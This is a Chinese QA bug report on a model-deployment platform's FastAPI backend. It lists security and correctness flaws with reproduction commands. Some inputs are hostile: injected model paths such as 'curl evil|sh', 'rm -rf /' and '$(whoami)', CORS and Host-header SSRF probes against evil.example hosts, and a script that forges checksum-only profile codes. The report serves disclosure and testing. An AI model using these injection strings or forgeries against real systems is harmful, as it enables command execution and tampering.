# 后端控制面（backend/）QA 发现报告

- 仓库：/Users/supre/Documents/tmp/model-deploy-platform
- 分支：feat/client-hardware-profile（未切换/未合并/未 push，git 工作区保持干净）
- 被测对象：backend/ FastAPI 控制面（services 层直测 + 运行中的 http://127.0.0.1:8790）
- 基线：\`cd backend && .venv/bin/python -m pytest -q\` → **31 passed**（确认与任务描述一致）
- 说明：本报告只记录问题，未修改任何源码。所有「确认的 bug」均贴出本机真实输出；「代码审查怀疑」明确标注且未复现。

---

## 一、严重

### B-01 CORS 全开 \`*\` + 本机回环信任，任何网页都能「drive-by」在用户机器上创建/启动部署

- 严重程度：**严重**
- 位置：\`backend/app/main.py:20-25\`（CORSMiddleware）、\`backend/app/main.py:67-69\`（_client_is_local）、\`backend/app/main.py:198-210\`（create_deployment）
- 复现（确认 CORS 配置；攻击链为代码审查推断）：

\`\`\`bash
curl -s -i -X OPTIONS http://127.0.0.1:8790/api/deployments \
  -H 'Origin: https://evil.example' \
  -H 'Access-Control-Request-Method: POST' \
  -H 'Access-Control-Request-Headers: content-type' | grep -i access-control
\`\`\`

实际输出：

\`\`\`
access-control-allow-origin : *
access-control-allow-methods : DELETE, GET, HEAD, OPTIONS, PATCH, POST, PUT
access-control-max-age : 600
access-control-allow-headers : content-type
\`\`\`

- 期望：控制面是「无鉴权的本机控制平面」，跨源请求应默认拒绝（不允许 \`*\`），至少对写操作（POST /api/deployments、/start、/stop、/test）限制 Origin 或要求本机 token；否则浏览器发起的请求与真实本机进程无法区分。
- 实际：\`allow_origins=["*"]\`、\`allow_methods=["*"]\`、\`allow_headers=["*"]\`。而 \`_client_is_local\` 只看 TCP 对端地址，浏览器从任意网页发出的请求其 TCP 源地址是 \`127.0.0.1\`，因此被判定为本机、允许创建部署。\`POST /api/deployments/{id}/start\` 没有 body、无需预检，也可被跨源触发。
- 影响：用户只要在浏览器打开恶意页面，该页面即可对 \`http://127.0.0.1:8790\` 发起写请求，在用户机器上创建并启动模型部署（占满内存/执行本地进程），并读取返回内容。属于「本机无鉴权控制面 + CORS 全开」的 CSRF/Drive-by 风险。

### B-02 部署 ID 用秒级时间戳，同秒内多次创建互相覆盖，部署被静默丢失

- 严重程度：**严重**
- 位置：\`backend/app/services/deployments.py:46\`（\`dep_id = f"dep_{int(time.time())}"\`）
- 复现：

\`\`\`bash
cd /Users/supre/Documents/tmp/model-deploy-platform/backend && .venv/bin/python - <<'PY'
from app.services import deployments
ids = [deployments.create(model_path=f"/m/{i}", model_id=f"m{i}", backend="vllm")["id"] for i in range(3)]
print("ids:", ids)
print("distinct:", len(set(ids)), "stored:", len(deployments.DEPLOYMENTS))
print("surviving:", [d["model_path"] for d in deployments.DEPLOYMENTS.values()])
PY
\`\`\`

实际输出：

\`\`\`
ids: ['dep_1790098805', 'dep_1790098805', 'dep_1790098805']
distinct: 1 stored: 1
surviving: ['/m/2']
\`\`\`

接口级同样可复现：连续 3 次 \`POST /api/deployments\` 得到同一 id，\`GET /api/deployments\` 列表数量少于创建次数。

- 期望：部署 ID 全局唯一（uuid4 / 自增计数 / 秒级+随机后缀），并发创建互不覆盖。
- 实际：同一秒内创建的部署共用一个 key，后写覆盖前写；\`start/stop/health/test\` 只会作用于最后一条。
- 影响：部署记录静默丢失；用户点「停止」可能停到另一个模型；并发场景（前端连点、多客户端）必然触发。属于数据一致性缺陷。

### B-03 planner 生成的 \`command_string\` 未做 shell 转义，model_path 可注入任意命令

- 严重程度：**严重**
- 位置：\`backend/app/services/planner.py:129-151\`（\`cmd = [...]\`）与 \`planner.py:161\`（\`" ".join(cmd)\`）
- 复现：

\`\`\`bash
curl -s -X POST http://127.0.0.1:8790/api/plans/preview \
  -H 'Content-Type: application/json' \
  -d '{"backend":"llama.cpp","model_id":"qwen3-8b","model_path":"/models/x && curl evil|sh"}' \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["command_string"])'
\`\`\`

实际输出：

\`\`\`
llama-server -m /models/x && curl evil|sh --host 127.0.0.1 --port 8000 -c 32768 -ctk q8_0 -ctv q8_0 -fa on -ngl 99
\`\`\`

另外 \`model_path="/models/x; rm -rf /"\` 得到 \`vllm serve /models/x; rm -rf / --host ...\`；\`backend="ollama"\`、\`model_path="$(whoami)"\` 得到 \`ollama run $(whoami)\`。

- 期望：\`command_string\` 要么不返回（只返回 argv 列表），要么用 \`shlex.join(cmd)\` 正确转义；model_path/port/dtype 等字段做白名单校验。
- 实际：\`command\` 字段是安全的 argv 列表，但 \`command_string\` 用空格拼接、无任何转义，用户复制到终端即执行注入命令。
- 影响：前端「参数预览」页展示可复制命令，用户复制执行会被注入；若 model_path 来自远端客户端提交，则等同远程命令执行。

### B-04 remote 403 只保护「创建」，start/stop/test/health/list 完全没有远端校验

- 严重程度：**严重**
- 位置：\`backend/app/main.py:198-210\`（create 有 \`_client_is_local\` 判断）对比 \`main.py:212-239\`（start/stop/health/test）、\`main.py:220-222\`（list）
- 复现（源码级确认，未做真实跨机网络复现）：

\`\`\`bash
cd /Users/supre/Documents/tmp/model-deploy-platform/backend && .venv/bin/python - <<'PY'
from app import main
import inspect
for name in ["start_deployment","stop_deployment","deployment_test","deployment_health","list_deployments","create_deployment"]:
    src = inspect.getsource(getattr(main, name))
    print(name, "uses _client_is_local:", "_client_is_local" in src)
PY
\`\`\`

实际输出：

\`\`\`
start_deployment uses _client_is_local: False
stop_deployment uses _client_is_local: False
deployment_test uses _client_is_local: False
deployment_health uses _client_is_local: False
list_deployments uses _client_is_local: False
create_deployment uses _client_is_local: True
\`\`\`

- 期望：既然「共享服务不能替远端用户在本机部署」，那么 \`start\`（会把模型读进内存）、\`stop\`、\`test\`（会真实推理）、\`health\`、\`list\` 都应有同样的远端限制或至少鉴权。
- 实际：远端 LAN 客户端不能创建部署，却能对已存在的部署 id 调用 \`start\`/\`test\`/\`stop\`。\`start\` 会通过 \`/api/generate\` 把模型加载进 Ollama，\`test\` 会发真实 chat 请求。
- 影响：远端可远程触发模型加载（内存耗尽/DoS）、卸载他人模型、消耗算力并读取模型输出；与 \`ALLOW_REMOTE_DEPLOY=0\` 的意图相矛盾。

---

## 二、一般

### B-05 非有限浮点（NaN / Infinity / 1e400）的 available_vram_gb 触发 500

- 严重程度：**一般**
- 位置：\`backend/app/services/models.py:134-137\`（\`int(req.available_vram_gb * GIB)\`）
- 复现：

\`\`\`bash
for v in 1e400 Infinity NaN; do
  curl -s -w ' [%{http_code}]\n' -X POST http://127.0.0.1:8790/api/models/recommend \
    -H 'Content-Type: application/json' -d "{\"available_vram_gb\": $v}"
done
\`\`\`

实际输出：

\`\`\`
Internal Server Error [500]
Internal Server Error [500]
Internal Server Error [500]
\`\`\`

- 期望：\`available_vram_gb\` 与其它硬件字段一样走 \`_clamp\`，非有限值直接 400/422，而不是让 \`int(inf)\`/\`int(nan)\` 抛异常。
- 实际：Pydantic 接受 JSON 中的 \`Infinity/NaN/1e400\`（Python json 默认允许），随后 \`int(inf*GIB)\` 抛 \`OverflowError\`、\`int(nan*GIB)\` 抛 \`ValueError\`，FastAPI 返回 500 \`text/plain: Internal Server Error\`。
- 影响：畸形输入导致接口 500；客户端/前端若传入非法数值，服务端堆栈被触发（响应体不泄漏栈，但日志会）。同类问题也存在于 \`hardware\` 路径之外的任何未钳制浮点入口。

### B-06 客户端档案 \`gpus\` 为非列表（int/float/bool）时 \`budget_from_profile\` 抛 TypeError → 500

- 严重程度：**一般**
- 位置：\`backend/app/services/hardware.py:233\`（\`(profile.get("gpus") or [])[:MAX_GPUS]\`）
- 复现：

\`\`\`bash
for raw in '{"gpus": 5}' '{"gpus": true}' '{"gpus": 1.5}'; do
  curl -s -w ' [%{http_code}]\n' -X POST http://127.0.0.1:8790/api/hardware/parse \
    -H 'Content-Type: application/json' -d "{\"text\": $(python3 -c "import json,sys;print(json.dumps(sys.argv[1]))" "$raw")}"
done
\`\`\`

实际输出：

\`\`\`
Internal Server Error [500]
Internal Server Error [500]
Internal Server Error [500]
\`\`\`

同一根因也可经 \`POST /api/plans/preview\`（body \`{"hardware":{"gpus":5}}\`）和 \`POST /api/models/recommend\`（\`{"hardware":{"gpus":5}}\`）复现，均 500。

- 期望：对 \`gpus\` 做 \`isinstance(profile.get("gpus"), list)\` 判断，非列表按空列表/400 处理。
- 实际：真值型非列表（\`5\`、\`true\`、\`1.5\`）直接切片抛 \`TypeError: 'int' object is not subscriptable\`。注意：\`/api/hardware/resolve\` 走 Pydantic 的 \`list[dict]\` 会正确返回 422，因此同一个字段在 \`resolve\` 与 \`parse\` 下行为不一致。
- 影响：未校验的输入路径（parse/preview/recommend 的 hardware 字典）可被 500 打崩。

### B-07 \`available_vram_gb\` 完全未钳制：可正可负，且 UMA 下 usable > total 自相矛盾

- 严重程度：**一般**
- 位置：\`backend/app/services/models.py:134-137\`
- 复现：

\`\`\`bash
curl -s -X POST http://127.0.0.1:8790/api/models/recommend \
  -H 'Content-Type: application/json' -d '{"available_vram_gb": 100000}' \
  | python3 -c 'import sys,json;h=json.load(sys.stdin)["hardware"];print("usable_gb",h["usable_vram_gb"],"total_gb",h["total_device_gb"],"usable>total",h["usable_vram_bytes"]>h["total_device_bytes"])'
curl -s -X POST http://127.0.0.1:8790/api/models/recommend \
  -H 'Content-Type: application/json' -d '{"available_vram_gb": -5}' \
  | python3 -c 'import sys,json;h=json.load(sys.stdin)["hardware"];print("usable_gb",h["usable_vram_gb"])'
\`\`\`

实际输出：

\`\`\`
usable_gb 100000.0 total_gb 24.0 usable>total True
usable_gb -5.0
\`\`\`

- 期望：\`available_vram_gb\` 应复用 \`hardware._clamp(..., VRAM_MIN_GB, VRAM_MAX_GB)\`，并保证 \`total_device_bytes >= usable_vram_bytes\`。
- 实际：直接 \`int(req.available_vram_gb * GIB)\`。非 UMA 分支只做了 \`total = max(total, usable)\`；UMA 分支（本机 Apple M5 即 UMA）不做任何修正，于是 usable(100000GB) > total(24GB)。负值则得到负预算。
- 影响：预算不自洽，可让本不该驻留的大模型被判定 zero_spill；负预算下所有模型被 \`physics-refused\`。与「按客户端硬件定价」的核心不变量冲突。

### B-08 plan_window 会返回大于模型 native_ctx 的窗口，规划命令把上下文开到模型声明之外

- 严重程度：**一般**
- 位置：\`backend/app/services/estimator.py:121-138\`（\`cap = native or target\`；\`best = floor\`；\`while window <= cap\`）
- 复现：

\`\`\`bash
cd /Users/supre/Documents/tmp/model-deploy-platform/backend && .venv/bin/python - <<'PY'
from app.services import estimator
from app.services.catalog import CATALOG
from app.services.hardware import HardwareBudget, GIB
b = HardwareBudget(4096*GIB, 4096*GIB, 0, False, "test")
for e in CATALOG:
    p = e.profile(e.variants[0])
    w = estimator.plan_window(p, b)
    if w > e.native_ctx:
        print(f"{e.id:20} native={e.native_ctx} planned={w}")
PY
\`\`\`

实际输出（节选）：

\`\`\`
qwen2.5-0.5b         native=32768 planned=65536
qwen2.5-7b           native=32768 planned=65536
qwen3-8b             native=32768 planned=65536
qwen2.5-14b          native=32768 planned=65536
qwen3-32b            native=32768 planned=65536
\`\`\`

接口级：

\`\`\`bash
curl -s -X POST http://127.0.0.1:8790/api/plans/preview \
  -H 'Content-Type: application/json' \
  -d '{"backend":"llama.cpp","model_id":"qwen2.5-7b"}' \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d["decision"]["planned_window"], d["command_string"])'
\`\`\`

实际输出：

\`\`\`
65536 llama-server -m G:/models/Qwen3-8B --host 127.0.0.1 --port 8000 -c 65536 -ctk q8_0 -ctv q8_0 -fa on -ngl 99
\`\`\`

- 期望：窗口应被 native_ctx 夹住（\`cap = min(native, ...)\`），当 native < 64K floor 时至少不能返回 > native 的值；否则 \`-c 65536\` 与 \`planned_window\` 都应反映真实可支持上限。
- 实际：\`best\` 初值就是 floor（64K），当 \`cap=native=32768 < floor\` 时 while 循环一次都不执行，直接返回 floor。catalog 中 17/24 个条目 native_ctx=32768，均命中此问题。
- 影响：规划/命令把上下文窗口开到模型声明之外，llama.cpp 会按超出训练窗口运行（质量下降/行为不可预期）；UI 展示的 planned_window 也不可信。与文件头「native cap」的注释相矛盾。

### B-09 不存在的部署 id：GET 返回 200 + \`{}\`，其余操作返回 500；错误语义不一致

- 严重程度：**一般**
- 位置：\`backend/app/services/deployments.py:169-170\`（get 返回 \`{}\`）对比 \`deployments.py:81-84,145-148,175-179,192-194\`（其余 \`raise ValueError\`）
- 复现：

\`\`\`bash
curl -s -w ' [%{http_code}]\n' http://127.0.0.1:8790/api/deployments/nope
curl -s -w ' [%{http_code}]\n' http://127.0.0.1:8790/api/deployments/nope/health
curl -s -w ' [%{http_code}]\n' -X POST http://127.0.0.1:8790/api/deployments/nope/start
curl -s -w ' [%{http_code}]\n' -X POST http://127.0.0.1:8790/api/deployments/nope/stop
curl -s -w ' [%{http_code}]\n' -X POST http://127.0.0.1:8790/api/deployments/nope/test -H 'Content-Type: application/json' -d '{}'
\`\`\`

实际输出：

\`\`\`
{} [200]
Internal Server Error [500]
Internal Server Error [500]
Internal Server Error [500]
Internal Server Error [500]
\`\`\`

- 期望：统一为 404（\`HTTPException(404, "deployment not found")\`），响应体为 JSON \`detail\`。
- 实际：\`get\` 静默返回空对象；其余未捕获 \`ValueError\` → 500。\`test_missing_deployment_raises\` 只测了 service 层抛异常，没测 HTTP 映射。
- 影响：前端无法区分「不存在」与「服务器内部错误」；监控被 500 噪声污染；与 FastAPI 常规 404 语义不符。

### B-10 \`port\` 无任何范围校验：0 / 负数 / 70000 / 超大整数都被接受

- 严重程度：**一般**
- 位置：\`backend/app/main.py:193\`（\`port: int = 8000\`，无 Field 约束）、\`backend/app/services/planner.py:31\`
- 复现：

\`\`\`bash
for p in 0 -1 70000 999999999999999999999; do
  curl -s -X POST http://127.0.0.1:8790/api/deployments \
    -H 'Content-Type: application/json' \
    -d "{\"model_path\":\"m\",\"backend\":\"vllm\",\"port\":$p}" \
    | python3 -c 'import sys,json;print("port=",json.load(sys.stdin)["port"])'
done
\`\`\`

实际输出：

\`\`\`
port= 0
port= -1
port= 70000
port= 999999999999999999999
\`\`\`

planner 同样：\`POST /api/plans/preview\` 传 \`port:-1\` / \`70000\` 返回 200，命令里出现 \`--port -1\` / \`--port 70000\`。

- 期望：\`Field(8000, ge=1, le=65535)\`；planner 同理。
- 实际：任意 int 都通过，生成的 endpoint/命令端口非法。
- 影响：非法端口进入部署配置和生成命令，启动必然失败或占用错误端口；超大整数会进入字符串拼接。

### B-11 GPU 查表缺当前机型 Apple M5；表内 \`apple gpu\` 键因 normalize 被永久屏蔽

- 严重程度：**一般**
- 位置：\`backend/app/services/gpu_table.py:14-75\`（表）、\`gpu_table.py:80-86\`（normalize 删除 "gpu" 词元）、\`gpu_table.py:102-127\`（lookup）
- 复现：

\`\`\`bash
cd /Users/supre/Documents/tmp/model-deploy-platform/backend && .venv/bin/python - <<'PY'
from app.services import gpu_table
for n in ["Apple M5", "Apple M5 Pro", "Apple M50", "Apple GPU", "Tesla T4", "NVIDIA RTX A4000", "RTX 40900"]:
    print(f"{n!r:22} ->", gpu_table.lookup(n))
PY
\`\`\`

实际输出（节选）：

\`\`\`
'Apple M5'      -> matched=False vendor=unknown vram=None
'Apple M5 Pro'  -> matched=False vendor=unknown vram=None
'Apple M50'     -> matched=False vendor=unknown vram=None
'Apple GPU'     -> matched=False vendor=unknown vram=None   # 表里有 "apple gpu" 键，但永远匹配不到
'Tesla T4'      -> matched=False vendor=unknown vram=None   # 表键是 "nvidia t4"
'NVIDIA RTX A4000' -> matched=False vendor=unknown vram=None
'RTX 40900'     -> matched=True  vendor=nvidia vram=24      # 子串误匹配 "rtx 4090"
\`\`\`

- 期望：补上 Apple M5 系列；normalize 不应删除表键中出现的 "gpu"（或把键改为 \`apple\`）；对 \`rtx 4090\` 这类数字型号做词边界匹配；Tesla/A 系列等常见专业卡应可命中。
- 实际：本机（Apple M5）和 probe 脚本的兜底名 \`Apple GPU\` 都查不到；\`apple gpu\` 键是死键；\`RTX 40900\` 这类非真实型号被子串误判为 4090。
- 影响：当前主机的 GPU 型号无法识别（虽然 UMA 路径仍可用系统内存兜底），probe 兜底名命中失败会触发「型号未命中」警告；\`RTX 40900\` 误判会给出错误显存。子串匹配对未知尾缀缺乏边界校验。

### B-12 Host 头被用于构造 health_endpoint，\`/health\` 会向攻击者指定主机发起请求（SSRF）

- 严重程度：**一般**
- 位置：\`backend/app/main.py:72-75\`（_public_host）、\`main.py:209\`（create 传入 public_host）、\`deployments.py:73-74\`（endpoint/health_endpoint）、\`deployments.py:175-187\`（health 真正发起请求）
- 复现：

\`\`\`bash
DEP=$(curl -s -X POST http://127.0.0.1:8790/api/deployments \
  -H 'Content-Type: application/json' -H 'Host: evil.example.com' \
  -d '{"model_path":"m","backend":"vllm"}' | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d["id"]);import sys as s;print(d["health_endpoint"],file=s.stderr)')
curl -s http://127.0.0.1:8790/api/deployments/$DEP/health
\`\`\`

实际输出：

\`\`\`
http://evil.example.com:8000/health
{"deployment_id":"dep_...","url":"http://evil.example.com:8000/health","healthy":false,"error":"[Errno 8] nodename nor servname provided, or not known","status":"CREATED"}
\`\`\`

- 期望：\`display_host\` 只能取服务端已知的监听地址（或对 Host 头做白名单），health 检查应固定走 loopback。
- 实际：\`_public_host\` 直接使用请求 \`Host\` 头；\`health()\` 用 \`display_host\` 拼 URL 并发起真实 HTTP 请求。
- 影响：任意客户端可通过伪造 Host 让服务端向指定主机:端口发请求（内网探测/SSRF），并返回连接错误信息（可用于区分主机是否存在）。\`/api/hardware/probe-command\` 也会把 \`curl http://evil.example.com/...\` 作为「本机命令」展示给用户。

### B-13 \`/health\` 只探 Ollama 守护进程，STOPPED/FAILED 的部署仍报 healthy=true

- 严重程度：**一般**
- 位置：\`backend/app/services/deployments.py:74\`（ollama 的 health_endpoint 是 \`/api/tags\`）、\`deployments.py:175-187\`
- 复现：

\`\`\`bash
DEP=$(curl -s -X POST http://127.0.0.1:8790/api/deployments -H 'Content-Type: application/json' \
  -d '{"model_path":"ignored","backend":"ollama","model_name":"definitely-not-a-model-xyz"}' \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["id"])')
curl -s -X POST http://127.0.0.1:8790/api/deployments/$DEP/start >/dev/null
curl -s -X POST http://127.0.0.1:8790/api/deployments/$DEP/stop >/dev/null
curl -s http://127.0.0.1:8790/api/deployments/$DEP/health
\`\`\`

实际输出：

\`\`\`
{"deployment_id":"dep_...","url":"http://127.0.0.1:11434/api/tags","status_code":200,"healthy":true,"status":"STOPPED"}
\`\`\`

- 期望：health 应反映「该部署的模型是否在运行」；Ollama 模式下至少校验目标模型已加载/未被 unload，或明确标注为「守护进程健康」而非部署健康。
- 实际：\`/api/tags\` 只说明 Ollama 活着，与被部署的模型无关；即使 start 失败（模型不存在）或已 stop，仍返回 healthy=true。
- 影响：前端/用户误判部署可用，实际模型未加载；排障时给出错误信号。

### B-14 档案码「自校验」是不带密钥的校验和，任何人都能改内容后重算通过

- 严重程度：**一般**
- 位置：\`backend/app/services/profiles.py:15-19\`（\`sha256(raw).hexdigest()[:8]\`）、\`profiles.py:22-40\`（decode 校验）
- 复现：

\`\`\`bash
cd /Users/supre/Documents/tmp/model-deploy-platform/backend && .venv/bin/python - <<'PY'
import base64, hashlib, json, httpx
B="http://127.0.0.1:8790"
prof={"source":"agent","ram_gb":24,"gpus":[{"name":"Apple M5","uma":True}]}
code=httpx.post(B+"/api/hardware/profile-code",json={"profile":prof}).json()["code"]
head,payload,digest=code.split(".")
tampered=dict(prof); tampered["ram_gb"]=4096
raw=json.dumps(tampered,separators=(",",":"),sort_keys=True).encode()
p2=base64.urlsafe_b64encode(raw).decode().rstrip("=")
d2=hashlib.sha256(raw).hexdigest()[:8]           # 攻击者自己重算
r=httpx.post(B+"/api/hardware/parse",json={"text":head+"."+p2+"."+d2})
print(r.status_code, r.json()["budget"]["total_device_gb"])
PY
\`\`\`

实际输出：

\`\`\`
200 4096.0
\`\`\`

（只改 payload、保留旧 digest 时确实返回 400 \`档案码校验和不匹配\`——但校验和不是签名。）

- 期望：文档 \`profiles.py:1-6\` 声称「tampered code fails loudly instead of silently producing a wrong budget」。若真要有完整性保证，应使用 HMAC/签名；若只是防手滑截断，应明确说明它不是防篡改。
- 实际：sha256 前 8 位（32bit）无密钥，任何能构造 payload 的人都能重算，从而生成「被接受但内容任意」的档案码（本机实测 ram_gb=4096 被接受，随后被钳制到 4096）。
- 影响：档案码被误当作可信凭证；虽然 \`budget_from_profile\` 仍会钳制并标记 untrusted，但注释/文档给出的安全承诺不成立。校验和只有 32bit，碰撞概率也偏高。

### B-15 「spill-visible（可溢出但显式可选）」在客户端档案与 UMA 下不可达，溢出模型全部被判为 physics-refused

- 严重程度：**存疑**（行为已确认，是否算 bug 取决于设计意图）
- 位置：\`backend/app/services/estimator.py:99-113\`（physics_check 的 available）、\`backend/app/services/catalog.py:151-160\`、\`backend/app/services/hardware.py:273\`（客户端 \`ram_available_bytes=0\`）
- 复现：

\`\`\`bash
cd /Users/supre/Documents/tmp/model-deploy-platform/backend && .venv/bin/python - <<'PY'
from app.services.hardware import HardwareBudget
from app.services.catalog import resolve
from collections import Counter
GIB=1024**3
for ram in [0, 64]:
    b=HardwareBudget(16*GIB, 16*GIB, ram*GIB, False, "test")
    out=resolve(b, backend="vllm")
    print(f"usable=16GB ram_available={ram}GB:", Counter(c.reason_key for c in out["choices"]))
PY
\`\`\`

实际输出：

\`\`\`\`
usable=16GB ram_available=0GB: {'backend-incompatible': 5, 'zero-spill-resident': 13, 'physics-refused': 6}
usable=16GB ram_available=64GB: {'backend-incompatible': 5, 'zero-spill-resident': 13, 'spill-visible': 6}
\`\`\`

- 期望：核心不变量是「会溢出的模型保持可见、可解释、需显式选择」。若客户端档案无法知道空闲内存，应把「VRAM 放不下」与「物理放不下」区分开，或至少让 spill-visible 在客户端路径也可达。
- 实际：\`physics_check\` 的可用量 = \`usable_vram + (非 UMA 时 ram_available)\`，而客户端档案恒 \`ram_available=0\`、UMA 时又不加 RAM。于是「VRAM 放不下」的模型必然先在 physics_check 被拒，\`spill-visible\` 分支在客户端/UMA 路径不可达，只能靠服务端离散显卡（ram_available>0）触发。
- 影响：客户端档案下「可溢出」与「完全放不下」在 API 里无法区分，前端无法正确提示「可显式选择但会溢出」。现有测试 \`test_spill_models_stay_visible_but_are_never_auto_recommended\` 用的是 ram=0 的 budget，实际只覆盖到 physics-refused，未真正覆盖 spill-visible。

### B-16 错误响应格式不统一：400/403/422 是 JSON \`detail\`，500 是 \`text/plain: Internal Server Error\`

- 严重程度：**一般**
- 位置：全局（\`backend/app/main.py\`；未注册异常处理器）
- 复现：

\`\`\`bash
echo "--- 400"; curl -s -i -X POST http://127.0.0.1:8790/api/hardware/parse -H 'Content-Type: application/json' -d '{"text":""}' | tail -2
echo "--- 422"; curl -s -i -X POST http://127.0.0.1:8790/api/hardware/parse -H 'Content-Type: application/json' -d '{}' | tail -2
echo "--- 500"; curl -s -i -X POST http://127.0.0.1:8790/api/hardware/parse -H 'Content-Type: application/json' -d '{"text":"{\"gpus\": 5}"}' | tail -2
\`\`\`

实际输出：

\`\`\`
--- 400
content-type: application/json
{"detail":"输入为空"}
--- 422
content-type: application/json
{"detail":[{"type":"missing","loc":["body","text"],...}]}
--- 500
content-type: text/plain; charset=utf-8
Internal Server Error
\`\`\`

- 期望：所有错误都返回统一 JSON 结构（如 \`{"detail": ...}\`），并注册 \`ValueError\`/\`TypeError\` 处理器映射为 400/404，而不是裸 500。
- 实际：4xx 是 JSON，500 是纯文本。好消息是未把内部堆栈泄漏给客户端（\`text/plain: Internal Server Error\`），但格式不一致。
- 影响：前端统一错误处理困难；500 无法给出可读原因；部分本应是 400/404 的输入错误被当成服务端故障。

---

## 三、轻微

### B-17 \`_public_host\` 对 IPv6 Host 头解析错误（\`[::1]:8790\` → \`[\`）

- 严重程度：**轻微**
- 位置：\`backend/app/main.py:72-75\`（\`host.split(":")[0]\`）
- 复现：

\`\`\`bash
cd /Users/supre/Documents/tmp/model-deploy-platform/backend && .venv/bin/python - <<'PY'
from starlette.requests import Request
from app import main
def mkreq(h):
    scope={"type":"http","method":"GET","path":"/","headers":[(k.lower().encode(),v.encode()) for k,v in h.items()],
           "client":("127.0.0.1",1),"scheme":"http","server":("127.0.0.1",8790),"query_string":b"","root_path":""}
    return Request(scope)
for h in [{"Host":"[::1]:8790"},{"Host":"192.168.1.5:8790"},{"Host":"evil.com"}]:
    print(h, "->", repr(main._public_host(mkreq(h))))
PY
\`\`\`

实际输出：

\`\`\`
{'Host': '[::1]:8790'} -> '['
{'Host': '192.168.1.5:8790'} -> '192.168.1.5'
{'Host': 'evil.com'} -> 'evil.com'
\`\`\`

- 期望：用 \`urllib.parse\` 或 \`request.url.hostname\` 解析，IPv6 应得到 \`::1\` 并正确加方括号。
- 实际：按冒号切分把 \`[::1]\` 切成 \`[\`，生成的 endpoint 变成 \`http://[:8000/v1\`。
- 影响：通过 IPv6 访问控制面时，部署的 endpoint/health_endpoint 全部畸形。

### B-18 \`_detect_backends\` 使用 \`importlib.util\` 但只 \`import importlib\`（潜在 AttributeError 被吞）

- 严重程度：**轻微**（运行时被 fastapi 的导入掩盖）
- 位置：\`backend/app/services/deployments.py:8-40\`
- 复现（隔离导入时）：

\`\`\`bash
cd /Users/supre/Documents/tmp/model-deploy-platform/backend && .venv/bin/python - <<'PY'
import importlib
print("hasattr importlib.util:", hasattr(importlib, "util"))
from app.services import deployments
print("backends:", deployments.available_backends())
PY
\`\`\`

实际输出：

\`\`\`
hasattr importlib.util: False
backends: {'backends': ['ollama']}
\`\`\`

对照：先 \`import fastapi\`（或 \`import app.main\`）后 \`importlib.util\` 才存在，此时 vllm/sglang/torch 未安装，结果仍是 \`['ollama']\`。

- 期望：显式 \`import importlib.util\`。
- 实际：\`_detect_backends\` 里三次 \`importlib.util.find_spec(...)\` 都抛 \`AttributeError\`，被 \`except Exception: pass\` 吞掉，导致 vllm/sglang/transformers 永远探测不到。运行中的服务因为先导入了 fastapi（其内部导入了 importlib.util）而恰好不触发，属于「被掩盖的潜在缺陷」；在只导入 deployments 的单元测试/CLI 场景下会静默失效。本机未装这些后端，故未造成可见行为差异。
- 影响：在装有 vllm/sglang/torch 的机器上，\`/api/backends\` 会漏报；\`create\` 的默认后端选择（\`detected[0] if detected else "transformers"\`）会退回 transformers。

### B-19 \`plan_window\` 在 floor <= 1 时死循环（内部参数，当前不可达）

- 严重程度：**轻微**（潜在）
- 位置：\`backend/app/services/estimator.py:132-137\`（\`window = int(window * 1.5)\`）
- 复现：

\`\`\`bash
cd /Users/supre/Documents/tmp/model-deploy-platform/backend && .venv/bin/python - <<'PY'
import signal
from app.services import estimator
from app.services.catalog import CATALOG
from app.services.hardware import HardwareBudget, GIB
p=CATALOG[0].profile(CATALOG[0].variants[0])
b=HardwareBudget(10**12,10**12,0,False,"test")
def h(s,f): raise TimeoutError("no termination")
for floor in [0,1,2,-1]:
    signal.signal(signal.SIGALRM,h); signal.alarm(3)
    try: print("floor",floor,"->",estimator.plan_window(p,b,floor=floor))
    except TimeoutError: print("floor",floor,"-> HANG")
    finally: signal.alarm(0)
PY
\`\`\`

实际输出：

\`\`\`
floor 0 -> HANG
floor 1 -> HANG
floor 2 -> 27310
floor -1 -> HANG
\`\`\`

- 期望：循环步进保证单调递增（如 \`window = max(window+1, int(window*1.5))\`），并对 floor<=0 做参数校验。
- 实际：\`int(0*1.5)=0\`、\`int(1*1.5)=1\`、\`int(-1*1.5)=-1\`，\`window\` 不变，while 永不退出。
- 影响：当前 \`floor\` 恒为内部常量 \`FLOOR_WINDOW=65536\`，外部不可控，因此未触发；但 \`select_variant/plan_window\` 都暴露了 \`floor\` 形参，一旦被配置化或误传 0/负数，请求会永久挂起（DoS）。

### B-20 \`transformers_server\` 的 \`stream=true\` 返回单个非 SSE JSON，不符合 OpenAI 流式契约

- 严重程度：**轻微**
- 位置：\`backend/app/runtimes/transformers_server.py:66-74\`
- 复现（代码审查）：请求 \`{"stream": true}\` 时直接 \`return JSONResponse(content=chunk)\`，而非 \`text/event-stream\` 的 \`data: {...}\n\n\` 分块。
- 期望：流式请求返回 SSE，或明确不支持并报错。
- 实际：返回一个 \`chat.completion.chunk\` 对象、\`Content-Type: application/json\`，客户端按 SSE 解析会失败。
- 影响：任何依赖流式输出的客户端（前端聊天、OpenAI SDK）会解析异常或看不到增量。

### B-21 planner 的 \`VARIANT_MEMORY\` 用变体 id 做键，但 \`_entry\` 只按 base id 查 catalog，默认路径永远走 fallback

- 严重程度：**轻微**
- 位置：\`backend/app/services/planner.py:21-24\`（键为 \`qwen3-8b-bf16\` 等）、\`planner.py:43-47\`（\`_entry\` 按 \`entry.id\` 匹配）、\`planner.py:27-29\`（默认 \`model_id="qwen3-8b-bf16"\`）
- 复现：

\`\`\`bash
cd /Users/supre/Documents/tmp/model-deploy-platform/backend && .venv/bin/python - <<'PY'
from app.services import planner
for mid in ["qwen3-8b-bf16", "qwen3-8b", "qwen3-8b-awq"]:
    print(mid, "-> entry:", planner._entry(mid).id if planner._entry(mid) else None)
PY
\`\`\`

实际输出：

\`\`\`
qwen3-8b-bf16 -> entry: None
qwen3-8b -> entry: qwen3-8b
qwen3-8b-awq -> entry: None
\`\`\`

- 期望：\`_entry\` 应同时识别 \`VARIANT_MEMORY\` 里的变体 id（或把 catalog id 与变体 id 统一）。
